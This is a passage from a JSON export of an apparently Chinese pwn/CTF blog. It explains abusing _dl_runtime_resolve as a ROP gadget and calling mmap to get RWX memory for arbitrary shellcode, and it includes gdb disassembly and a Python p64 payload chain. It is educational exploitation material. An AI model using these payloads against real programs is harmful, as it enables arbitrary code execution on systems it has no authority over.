rcx,QWORD PTR [rsp+0x8]\n0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    mov     rax,QWORD PTR [rsp]\n0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add     rsp,0x48\n0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp     r11\n\n\n\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684PLT\u786e\u5b9a_dl_runtime_resolve()\u5730\u5740, \u5176\u4e2dPLT[2]\u4e2d\u8df3\u8f6c\u7684\u5730\u5740\u5c31\u662f_dl_runtime_resolve()\u5730\u5740\n\u8981\u5229\u7528\u8fd9\u4e2agadget, \u6211\u4eec\u8fd8\u9700\u8981\u63a7\u5236rax\u7684\u503c, \u56e0\u4e3agadget\u662f\u901a\u8fc7rax\u8df3\u8f6c\u7684:0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax\n...\n0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11\n\n\n\n\n\u5229\u7528mmap\u6267\u884c\u4efb\u610fshellcode\nmmap\u6216\u8005mprotect\u5c06\u67d0\u5757\u5185\u5b58\u6539\u6210RWX, \u7136\u540e\u5c06shellcode\u4fdd\u5b58\u5230\u8fd9\u5757\u5185\u5b58, \u7136\u540e\u63a7\u5236pc\u8df3\u8f6c\u8fc7\u53bb\u5c31\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7684shellcode\u4e86.\n# mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)\n# \u53c2\u6570\u4f20\u9012\u4ecelinker_addr + 0x35\u5f00\u59cb\n# \u9700\u8981\u5148pop rax,ret,\u4e14\u4f7frax=mmap_addr\n# r9,r8,rdi,rsi,rdx,rcx,rax\n# \u6700\u540e\u9700\u8981(0x48-8*6)/8 = 3Byte padding\npayload3 =  &quot;\\x00&quot;*136\npayload3 += p64(pop_rax_ret) + p64(mmap_addr)\npayload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0)\n\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "ROP", "slug": "ROP", "permalink": "/tag/ROP/"}]}], "pages": [{"title": "\u5173\u4e8e", "date": "2018-03-28T00:00:00-00.00", "path": "/about/", "text": "\u8fd9\u91cc\u662f\u6211\u7684\u4e2a\u4eba\u535a\u5ba2\uff0c\u901a\u8fc7 GitHub \u7ba1\u7406\u4e0e\u6784\u5efa\u3002\nContact\nEmail: yuripwn@gmail.com\n", "categories": [], "tags": []}]}